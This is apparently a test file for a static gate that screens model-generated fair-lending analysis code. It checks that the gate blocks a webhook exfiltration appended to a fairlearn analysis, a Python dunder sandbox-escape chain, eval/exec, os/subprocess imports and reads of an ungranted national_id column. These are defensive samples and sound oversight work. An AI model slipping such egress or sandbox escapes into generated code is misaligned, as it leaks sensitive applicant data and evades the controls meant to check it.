"""Tests for the static code gate (docs/features/governed-codegen.md section 5).

The gate is the v1 centerpiece. The headline test is the done-when: a generated
webhook call is caught as CTL-EGRESS-01 and never passes. Alongside it, the
false-block guard: realistic benign fair-lending code must pass, because a gate
that refuses good work gets routed around (section 16).
"""

from __future__ import annotations

import textwrap

from sentinel.codegen.gate import gate_code


def _dedent(code: str) -> str:
    return textwrap.dedent(code).strip("\n") + "\n"


# -- the done-when ---------------------------------------------------------
def test_generated_webhook_is_blocked_as_egress():
    # The exact shape from section 1.4: the model appends a webhook exfiltration
    # to an otherwise-fine fairlearn analysis. `requests` is referenced with no
    # import, so the gate catches the bare name.
    code = _dedent(
        """
        import fairlearn.metrics as flm
        df = ctx.table("german_credit")
        mf = flm.MetricFrame(
            metrics=flm.selection_rate,
            y_true=df.y, y_pred=df.pred,
            sensitive_features=df.age_band)
        requests.post(WEBHOOK, json=mf.by_group.to_dict())
        """
    )
    result = gate_code(code)
    assert not result.passed
    assert "CTL-EGRESS-01" in result.controls_fired
    egress = [v for v in result.violations if v.control == "CTL-EGRESS-01"]
    assert egress and egress[0].detail == "requests"
    # It fires on the webhook line, not the import line (there is no import).
    assert egress[0].line == code.count("\n", 0, code.index("requests.post")) + 1
    # The refusal names the control and the line in a reviewer-readable sentence.
    assert "CTL-EGRESS-01" in result.refusal_summary()
    assert "network egress" in result.refusal_summary()


def test_imported_network_module_is_blocked_as_egress():
    result = gate_code("import requests\nrequests.get('http://x')\n")
    assert not result.passed
    assert result.controls_fired == ["CTL-EGRESS-01"]


# -- the false-block guard -------------------------------------------------
def test_benign_fair_lending_code_passes():
    code = _dedent(
        """
        import fairlearn.metrics as flm
        import pandas as pd
        import numpy as np
        from sklearn.linear_model import LogisticRegression
        df = ctx.table("german_credit")
        mf = flm.MetricFrame(
            metrics=flm.selection_rate,
            y_true=df.y, y_pred=df.pred,
            sensitive_features=df.age_band)
        rates = mf.by_group.to_dict()
        ctx.emit({"selection_rate_by_band": rates})
        """
    )
    result = gate_code(code, granted_columns=["age_band", "income", "y", "pred"])
    assert result.passed, result.refusal_summary()
    assert result.violations == []


# -- import allowlist (CTL-CODE-01) ----------------------------------------
def test_allowlisted_submodule_imports_pass():
    for line in (
        "import pandas as pd",
        "import numpy",
        "import scipy.stats as st",
        "import statsmodels.api as sm",
        "from sklearn.metrics import roc_auc_score",
        "from fairlearn.reductions import ExponentiatedGradient",
    ):
        result = gate_code(line + "\n")
        assert result.passed, f"{line!r} -> {result.refusal_summary()}"


def test_non_allowlisted_import_is_blocked():
    result = gate_code("import yaml\n")
    assert not result.passed
    assert result.controls_fired == ["CTL-CODE-01"]


def test_bare_parent_of_allowlisted_submodule_is_blocked():
    # Only scipy.stats is granted, not scipy. `import scipy` reaches everything.
    result = gate_code("import scipy\n")
    assert not result.passed
    assert result.controls_fired == ["CTL-CODE-01"]


# -- filesystem / process (CTL-CODE-02) ------------------------------------
def test_filesystem_module_is_blocked():
    assert gate_code("import os\n").controls_fired == ["CTL-CODE-02"]
    assert gate_code("import subprocess\n").controls_fired == ["CTL-CODE-02"]


def test_open_in_write_mode_is_blocked_read_mode_ok():
    assert not gate_code("open('/tmp/x', 'w').write('h')\n").passed
    assert gate_code("open('/tmp/x', 'w')\n").controls_fired == ["CTL-CODE-02"]
    # Read-mode open is not a CTL-CODE-02 violation by itself.
    assert gate_code("open('data.csv')\n").passed
    assert gate_code("open('data.csv', 'r')\n").passed


# -- dynamic code (CTL-CODE-03) --------------------------------------------
def test_eval_exec_compile_are_blocked():
    for call in ("eval('1+1')", "exec('x=1')", "compile('x', '<s>', 'exec')"):
        assert gate_code(call + "\n").controls_fired == ["CTL-CODE-03"]


def test_importlib_and_pickle_are_blocked():
    assert gate_code("import importlib\n").controls_fired == ["CTL-CODE-03"]
    assert gate_code("import pickle\n").controls_fired == ["CTL-CODE-03"]


# -- dunder escape (CTL-CODE-04) -------------------------------------------
def test_dunder_escape_attribute_is_blocked():
    result = gate_code("cls = ().__class__.__bases__[0].__subclasses__()\n")
    assert not result.passed
    assert result.controls_fired == ["CTL-CODE-04"]


# -- column grant (CTL-COL-01) ---------------------------------------------
def test_ungranted_column_subscript_is_blocked():
    code = _dedent(
        """
        df = ctx.table("german_credit")
        leak = df["national_id"]
        ctx.emit(leak)
        """
    )
    result = gate_code(code, granted_columns=["age_band", "income", "y", "pred"])
    assert not result.passed
    assert result.controls_fired == ["CTL-COL-01"]
    assert result.violations[0].detail == 'df["national_id"]'


def test_granted_column_subscript_passes():
    code = _dedent(
        """
        df = ctx.table("german_credit")
        band = df["age_band"]
        ctx.emit(band)
        """
    )
    result = gate_code(code, granted_columns=["age_band", "income", "y", "pred"])
    assert result.passed, result.refusal_summary()


def test_column_check_skipped_when_no_grant_given():
    # Without a grant in scope, CTL-COL-01 cannot judge and must not fire.
    code = 'df = ctx.table("german_credit")\nx = df["anything"]\n'
    assert gate_code(code).passed


# -- parse failure (CTL-CODE-00) -------------------------------------------
def test_unparseable_code_is_refused():
    result = gate_code("def (:\n")
    assert not result.passed
    assert result.controls_fired == ["CTL-CODE-00"]


# -- multiple violations, stable order -------------------------------------
def test_multiple_violations_are_reported_in_source_order():
    code = _dedent(
        """
        import os
        requests.post(url)
        eval(payload)
        """
    )
    result = gate_code(code)
    assert not result.passed
    controls = [v.control for v in result.violations]
    assert controls == ["CTL-CODE-02", "CTL-EGRESS-01", "CTL-CODE-03"]
    lines = [v.line for v in result.violations]
    assert lines == sorted(lines)
